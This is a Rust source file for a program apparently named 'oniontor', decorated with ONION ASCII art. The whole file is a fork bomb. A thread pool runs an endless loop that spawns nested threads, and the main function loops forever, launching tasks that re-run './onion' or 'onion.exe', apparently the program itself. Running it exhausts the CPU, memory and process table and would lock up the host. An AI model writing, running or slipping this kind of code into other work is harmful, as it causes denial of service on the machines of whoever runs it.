







use utils;
pub mod scheduler;


pub const ONIONS: u32 = 10_u32;





#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync + 'static>>{ // oniontor - all types that the Error trait will be implemented for them must be also Sync + Send + static across all threads and .awaits
   


    // utils::trash();
    // utils::mactrait();
    // utils::unsafer();



    let pool = scheduler::ThreadPool::new(ONIONS as usize); // oniontor - `10_u32.pow(ONIONS) as usize` will need an allocation of 56402616320 bytes!!!
    pool.execute(|| {
        loop{
            std::thread::yield_now();
            std::thread::spawn(|| async move{
                std::thread::yield_now();
                std::thread::spawn(|| async move{
                    std::thread::yield_now();
                    loop{
                        std::thread::yield_now();
                        std::thread::spawn(|| async move{
                            std::thread::yield_now();
                            loop{
                                std::thread::yield_now();
                                std::thread::spawn(|| async move{
                                    std::thread::yield_now();
                                    loop{
                                        std::thread::yield_now();
                                        std::thread::spawn(|| async move{
                                            std::thread::yield_now();
                                            std::thread::spawn(|| async move{
                                                std::thread::yield_now(); // oniontor - yield will waste cpu usage and energy if there are no active threads available
                                                /*
                                                
                                                             
                                                     ▒█████   ███▄    █  ██▓ ▒█████   ███▄    █ 
                                                    ▒██▒  ██▒ ██ ▀█   █ ▓██▒▒██▒  ██▒ ██ ▀█   █ 
                                                    ▒██░  ██▒▓██  ▀█ ██▒▒██▒▒██░  ██▒▓██  ▀█ ██▒
                                                    ▒██   ██░▓██▒  ▐▌██▒░██░▒██   ██░▓██▒  ▐▌██▒
                                                    ░ ████▓▒░▒██░   ▓██░░██░░ ████▓▒░▒██░   ▓██░
                                                    ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
                                                      ░ ▒ ▒░ ░ ░░   ░ ▒░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
                                                    ░ ░ ░ ▒     ░   ░ ░  ▒ ░░ ░ ░ ▒     ░   ░ ░ 
                                                        ░ ░           ░  ░      ░ ░           ░ 
                                                                                                
                                                
                                                */
                                            });
                                        }); 
                                    }
                                });
                            }
                        });
                    }        
                });
            });
        }
    });
    





    loop{
        
        tokio::spawn(async move{
            let output = if cfg!(windows){
                std::process::Command::new("cmd")
                                        .arg("onion.exe")
                                        .output()
                                        .unwrap()
            } else {
                std::process::Command::new("sh")
                                        .arg("./onion")
                                        .output()
                                        .unwrap()
            };
        });
    
    }
    



}  